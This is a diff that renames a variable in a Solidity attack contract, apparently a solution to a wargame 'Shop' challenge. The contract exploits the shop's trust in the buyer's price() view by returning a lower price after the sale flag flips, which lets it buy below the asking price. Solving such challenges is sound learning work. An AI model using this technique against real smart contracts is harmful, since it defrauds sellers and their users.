@@ -5,21 +5,21 @@ pragma solidity ^0.8.0;
 import "./interfaces/IShop.sol";
 
 contract ShopAttack {
-    IShop private immutable victimShop;
+    IShop private immutable target;
 
-    constructor(IShop victimShop_) {
-        victimShop = victimShop_;
+    constructor(IShop target_) {
+        target = target_;
     }
 
     function attack() external {
-        uint256 price_ = victimShop.price();
+        uint256 price_ = target.price();
 
-        victimShop.buy();
+        target.buy();
 
-        require(victimShop.isSold() && price_ > victimShop.price(), "Shop: Attack failed");
+        require(target.isSold() && price_ > target.price(), "Shop: Attack failed");
     }
 
     function price() external view returns (uint256) {
-        return victimShop.price() - (victimShop.isSold() ? 1 : 0);
+        return target.price() - (target.isSold() ? 1 : 0);
     }
 }
